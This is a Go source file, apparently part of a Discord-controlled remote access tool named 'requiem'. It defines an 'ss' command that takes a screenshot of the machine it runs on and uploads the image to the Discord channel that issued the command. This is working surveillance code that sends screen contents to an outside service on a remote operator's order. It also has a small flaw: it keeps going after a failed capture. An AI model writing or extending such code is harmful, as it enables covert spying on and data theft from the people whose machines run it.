package commands

import (
	"requiem/funcs"

	"github.com/bwmarrin/discordgo"
)

func (*ScreenshotCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	buffer := funcs.TakeScreenshot()
	if buffer == nil {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to take screenshot.", msg.Reference())
	}

	ses.ChannelMessageSendComplex(msg.ChannelID, &discordgo.MessageSend{
		Reference: msg.Reference(),
		Files: []*discordgo.File{{
			Name:   "ss.jpg",
			Reader: buffer,
		}},
	})
}

func (*ScreenshotCommand) Name() string {
	return "ss"
}

func (*ScreenshotCommand) Info() string {
	return "Takes a screenshot."
}

type ScreenshotCommand struct{}
